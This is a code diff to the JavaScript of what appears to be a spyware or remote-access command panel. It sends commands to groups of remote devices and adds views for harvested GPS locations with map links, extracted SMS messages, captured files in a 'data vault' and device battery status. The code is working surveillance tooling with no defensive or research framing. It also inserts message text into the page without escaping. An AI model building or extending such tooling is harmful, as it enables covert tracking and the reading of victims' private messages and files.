@@ -551,36 +551,97 @@
             document.getElementById('status-content').innerHTML = '<div style="padding:20px; text-align:center;">FETCHING CLUSTER DATA...</div>';
             document.getElementById('status-overlay').style.display = 'flex';
 
-            const { data, error } = await sb.from('file_commands')
+            // 1. Fetch Command History
+            const { data: commands, error } = await sb.from('file_commands')
                 .select('*')
                 .eq('file_name', type)
                 .in('device_id', Array.from(selectedDeviceIds))
                 .order('created_at', { ascending: false })
-                .limit(15);
+                .limit(10);
 
             if (error) return document.getElementById('status-content').innerHTML = `Error: ${error.message}`;
 
-            document.getElementById('status-content').innerHTML = data.map(c => {
+            // 2. Fetch Latest Stats for cross-referencing (especially for FORCE_UPLOAD)
+            const { data: stats } = await sb.from('device_stats')
+                .select('*')
+                .in('device_id', Array.from(selectedDeviceIds))
+                .order('created_at', { ascending: false })
+                .limit(10);
+
+            document.getElementById('status-content').innerHTML = commands.map(c => {
                 let statusCol = 'var(--text)';
                 if (c.status === 'PENDING') statusCol = '#f59e0b';
                 if (c.status === 'RECEIVED') statusCol = 'var(--primary)';
                 if (c.status === 'EXECUTED' || c.status.includes('SUCCESS')) statusCol = 'var(--success)';
                 if (c.status.includes('FAILED') || c.status.includes('ERROR')) statusCol = 'var(--danger)';
 
+                // Helper: Find associated stat entry if this was a Force Upload
+                const relatedStat = type === 'FORCE_UPLOAD' ? stats.find(s => 
+                    s.device_id === c.device_id && 
+                    Math.abs(new Date(s.created_at) - new Date(c.updated_at || c.created_at)) < 60000
+                ) : null;
+
+                const dataPayload = relatedStat || c.result_data;
+                let dataHtml = "";
+
+                if (dataPayload) {
+                    const d = dataPayload.payload || dataPayload;
+                    
+                    // MODULE: LOCATION
+                    if (d.location_fresh || d.stream_location || d.lat) {
+                        const loc = d.location_fresh || d.stream_location || d;
+                        const mapsUrl = `https://www.google.com/maps?q=${loc.lat},${loc.lon}`;
+                        dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(0,243,255,0.1); border:1px solid var(--primary);">
+                            <div style="color:var(--primary); font-size:0.7rem; font-weight:bold;">📍 LOCATION_IDENTIFIED</div>
+                            <div style="font-size:0.8rem; margin:5px 0;">Coord: ${loc.lat.toFixed(5)}, ${loc.lon.toFixed(5)} (±${loc.acc || 0}m)</div>
+                            <a href="${mapsUrl}" target="_blank" style="color:#fff; text-decoration:underline; font-size:0.75rem;">VIEW ON GOOGLE MAPS</a>
+                        </div>`;
+                    }
+
+                    // MODULE: SMS
+                    if (d.sms_logs || d.historical_sms) {
+                        const logs = d.sms_logs || d.historical_sms;
+                        dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(0,255,157,0.1); border:1px solid var(--success);">
+                            <div style="color:var(--success); font-size:0.7rem; font-weight:bold;">💬 SMS_DATA_EXTRACTED (${logs.length})</div>
+                            <div style="font-size:0.7rem; color:#aaa; margin-top:5px; max-height:60px; overflow:hidden;">
+                                Last: "${logs[0]?.body || logs[0]?.txt || '...'}"
+                            </div>
+                            <div onclick="switchTab('dash')" style="color:var(--success); cursor:pointer; font-size:0.7rem; margin-top:5px; text-decoration:underline;">VIEW FULL LOGS IN DASHBOARD</div>
+                        </div>`;
+                    }
+
+                    // MODULE: VAULT / STORAGE
+                    if (d.size_report || c.result_file_path) {
+                        dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(112,0,255,0.1); border:1px solid var(--secondary);">
+                            <div style="color:var(--secondary); font-size:0.7rem; font-weight:bold;">💾 STORAGE_AUDIT</div>
+                            <div style="font-size:0.75rem;">${d.size_report || 'File Captured'}</div>
+                            ${c.result_file_path ? `<div onclick="switchTab('files')" style="color:var(--secondary); cursor:pointer; font-size:0.7rem; text-decoration:underline;">LOCATE IN DATA VAULT</div>` : ''}
+                        </div>`;
+                    }
+
+                    // MODULE: VITALS
+                    if (d.battery_level !== undefined) {
+                        dataHtml += `<div style="margin-top:10px; color:#888; font-size:0.65rem;">
+                            ⚡ BATT: ${d.battery_level}% | 📶 ONLINE: ${d.online_time_minutes || 0}m
+                        </div>`;
+                    }
+                }
+
                 return `
-                    <div class="card" style="margin-bottom:10px; border-left-color: ${statusCol}">
+                    <div class="card" style="margin-bottom:15px; border-left-color: ${statusCol}">
                         <div style="display:flex; justify-content:space-between; font-size:0.7rem; color:#666; margin-bottom:5px;">
                             <span>ID: ${c.device_id.substring(0,8)}...</span>
                             <span>${new Date(c.created_at).toLocaleString()}</span>
                         </div>
                         <div style="font-size:0.85rem; font-weight:bold; color:${statusCol}">${c.status}</div>
-                        <div style="font-size:0.75rem; color:#aaa; margin-top:5px; background:rgba(0,0,0,0.3); padding:5px;">${c.content.substring(0,60)}${c.content.length > 60 ? '...' : ''}</div>
-                        ${c.error_log ? `<div style="color:var(--danger); font-size:0.7rem; margin-top:5px;">ERROR: ${c.error_log}</div>` : ''}
-                        ${c.result_data ? `<div style="color:var(--primary); font-size:0.7rem; margin-top:5px; font-family:monospace;">RESULT: ${
-c.result_data.size_report || JSON['stringify'](c.result_data)}</div>` : ''}
+                        <div style="font-size:0.75rem; color:#666; margin-top:5px; font-style:italic;">CMD: ${c.content.substring(0,40)}</div>
+                        
+                        ${dataHtml}
+                        
+                        ${c.error_log ? `<div style="color:var(--danger); font-size:0.7rem; margin-top:8px; border-top:1px solid #300; padding-top:5px;">ERR_LOG: ${c.error_log}</div>` : ''}
                     </div>
                 `;
-            }).join('') || '<div style="padding:40px; text-align:center; color:#444;">NO COMMAND HISTORY FOR SELECTED CLUSTER</div>';
+            }).join('') || '<div style="padding:40px; text-align:center; color:#444;">NO COMMAND HISTORY</div>';
         }
 
         async function fetchFiles() {
